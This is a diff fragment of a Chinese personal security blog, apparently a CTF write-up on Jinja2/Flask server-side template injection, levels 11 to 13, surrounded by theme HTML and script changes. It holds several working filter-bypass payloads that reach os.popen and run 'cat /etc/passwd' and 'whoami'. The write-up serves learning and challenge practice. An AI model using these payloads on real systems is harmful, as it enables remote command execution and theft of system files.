read=dict(read=a)|join()%&#125;<br>&#123;%set req=dict(reques=a,t=b)|join()%&#125;<br>&#123;%set form=dict(form=a)|join()%&#125;<br>&#123;%set a=dict(a=a)|join()%&#125;<br>&#123;%set cmd=url_for|attr(globals)|attr(getitem)(req)|attr(form)|attr(getitem)(a)%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>至此，最终payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set req=dict(reques=a,t=b)|join()%&#125;<br>&#123;%set form=dict(form=a)|join()%&#125;<br>&#123;%set a=dict(a=a)|join()%&#125;<br>&#123;%set cmd=url_for|attr(globals)|attr(getitem)(req)|attr(form)|attr(getitem)(a)%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;&amp;a=cat /etc/passwd<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230802151957916.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p><img src="/2023/02/09/ssti/image-20230802152224096.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802151957916.png"></p>
+<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p><img src="/2023/02/09/ssti/image-20230802152224096.png"></p>
 <p>和11题差不了多少，就是下划线被过滤了，那url_for就用不了了，下划线用select获取，然后因为0-9被过滤了，用<code>length()</code>或者<code>count()</code>过滤器获取数字,试着从<code>&#123;&#123;request&#125;&#125;</code>溯源然后反过来利用request也没弄成功，不过问题不大，这题没有ban掉request，直接用</p>
 <p>pyaload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;%set pop=dict(pop=a)|join()%&#125;<br>&#123;%set str=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join()%&#125;<br>&#123;%set len=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join()|length()%&#125;<br>&#123;%set under=(a|select|string|list)|attr(pop)(str|length())%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set base=under~under~dict(base=a)|join()~under~under%&#125;<br>&#123;%set init=under~under~dict(init=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set subclasses=under~under~dict(subclasses=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set form=dict(form=a)|join()%&#125;<br>&#123;%set a=dict(a=a)|join()%&#125;<br>&#123;%set cmd=request|attr(form)|attr(getitem)(a)%&#125;<br>&#123;&#123;dict|attr(base)|attr(subclasses)()|attr(getitem)(len)|attr(init)|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;&amp;a=cat /etc/passwd<br></code></pre></td></tr></table></figure>
 
 <h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>我去。。。乍一看还有点吓人哈</p>
-<p><img src="/2023/02/09/ssti/image-20230802172049912.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802172049912.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;%set pop=dict(pop=a)|join()%&#125;<br>&#123;%set str=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join()%&#125;<br>&#123;%set under=(a|select|string|list)|attr(pop)(str|length())%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set base=under~under~dict(base=a)|join()~under~under%&#125;<br>&#123;%set cmd=dict(whoami=a)|join()%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;&#123;lipsum|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>这样已经可以getshell了，用lipsum很方便可以不用数字，但是shell命令不放在单独的一个请求参数里真的很难受。。。</p>
 <p>试了很久，request被禁了，上一题意外发现url_for可以访问到request，但是这一题下划线又被禁了。。好家伙。下划线被禁了url_for也没法用，没错下划线被ban了是可以绕过，但是最后组成的也只是”url_for”这样一个字符串而已，并不是对象本身，那request和url_for都是全局对象，url_for能访问到request，然后就去找flask中别的全局对象，看看能不能用和上一题类似的方法访问到url_for或者request，都没成功。。作罢</p>
 <p><code>&#123;&#123;lipsum.__globals__.__builtins__&#125;&#125;</code>里也有chr函数</p>
-
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" class="category-chain-item">常见漏洞</a>
-  
-  
-    <span>></span>
-    
-  <a href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/" class="category-chain-item">Web漏洞</a>
-  
-  
-
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/Web/">#Web</a>
-      
-        <a href="/tags/ssti/">#ssti</a>
-      
-    </div>
-  
-</div>
-
-
-              
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2023/02/09/SSRF/" title="SSRF">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">SSRF</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">
-                        <span class="hidden-mobile">文件包含</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>Table of Contents</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://potatowo233.github.io/" target="_blank" rel="nofollow noopener"><span>Potat0w0</span></a> <i class="iconfont icon-love"></i>
-
-    </div>
-  
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-  
-<script src="/js/click.js"></script>
-<script src="/js/snow.js"></script>
-<script src="/js/potato.js"></script>
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
-  </noscript>
-</body>
-</html>
+</div><div class="article-licensing box"><div class="licensing-title"><p>SSTI</p><p><a href="http://example.com/2023/02/09/ssti/">http://example.com/2023/02/09/ssti/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Potat0w0</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2023-02-09</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2024-01-10</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Web/">Web</a><a class="link-muted mr-2" rel="tag" href="/tags/ssti/">ssti</a></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/" alt="支付宝"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2023/02/09/SSRF/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">SSRF</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="level-item">文件包含</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/icon.jpg" alt="Potat0w0"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Potat0w0</p><p class="is-size-6 is-block">This is Potato&#039;s blog~</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Fuzhou,China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">34</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">17</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Potatowo233" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Potatowo233"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2024/01/"><span class="level-start"><span class="level-item">一月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">十二月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/11/"><span class="level-start"><span class="level-item">十一月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/10/"><span class="level-start"><span class="level-item">十月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">九月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">八月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/07/"><span class="level-start"><span class="level-item">七月 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/04/"><span class="level-start"><span class="level-item">四月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/03/"><span class="level-start"><span class="level-item">三月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/02/"><span class="level-start"><span class="level-item">二月 2023</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Docker/"><span class="tag">Docker</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java/"><span class="tag">Java</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Misc/"><span class="tag">Misc</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MySQL/"><span class="tag">MySQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Tools/"><span class="tag">Tools</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Web/"><span class="tag">Web</span><span class="tag">21</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cve/"><span class="tag">cve</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rce/"><span class="tag">rce</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sqli/"><span class="tag">sqli</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssrf/"><span class="tag">ssrf</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssti/"><span class="tag">ssti</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xss/"><span class="tag">xss</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">反序列化</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">文件上传</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tag">文件包含</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"><span class="tag">正则表达式</span><span class="tag">1</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><span class="level-start"><span class="level-item">做题记录</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><span class="level-start"><span class="level-item">学习记录</span></span><span class="level-end"><span class="level-item tag">4</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/Docker/"><span class="level-start"><span class="level-item">Docker</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"><span class="level-start"><span class="level-item">渗透工具</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E7%AC%94%E8%AE%B0/"><span class="level-start"><span class="level-item">笔记</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%87%AA%E5%BB%BA%E9%9D%B6%E5%9C%BA/"><span class="level-start"><span class="level-item">自建靶场</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"><span class="level-start"><span class="level-item">常见漏洞</span></span><span class="level-end"><span class="level-item tag">7</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/"><span class="level-start"><span class="level-item">Web漏洞</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-01-07T04:46:48.000Z">2024-01-07</time></p><p class="title"><a href="/2024/01/07/Vim%E5%AD%A6%E4%B9%A0/">Vim学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-01-01T08:06:34.000Z">2024-01-01</time></p><p class="title"><a href="/2024/01/01/16-PHP-Magic-Methods/">16_PHP_Magic_Methods</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-29T18:46:17.000Z">2023-12-30</time></p><p class="title"><a href="/2023/12/30/CVE-2023-47130%E5%88%86%E6%9E%90/">CVE-2023-47130分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-29T18:19:30.000Z">2023-12-30</time></p><p class="title"><a href="/2023/12/30/CVE-2023-41892%E5%88%86%E6%9E%90/">CVE-2023-41892分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-23T13:38:37.000Z">2023-12-23</time></p><p class="title"><a href="/2023/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">记一次CMS代码审计</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/icon.jpg" alt="Potat0w0" height="28"></a><p class="is-size-7"><span>&copy; 2024 Potat0w0</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">©❤POTATO</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
